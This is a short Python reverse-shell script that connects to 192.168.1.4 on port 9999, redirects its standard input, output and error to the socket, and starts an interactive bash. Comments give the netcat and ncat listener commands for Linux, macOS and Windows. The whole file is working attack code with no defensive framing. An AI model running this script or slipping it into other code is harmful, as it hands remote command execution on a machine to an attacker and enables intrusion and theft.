from os import dup2
from subprocess import run
import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.4", 9999))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
run(["/bin/bash", "-i"])

# mac/linux
# nc -l -p 9999 -vvv

# windows
# ncat -lvnp 9999
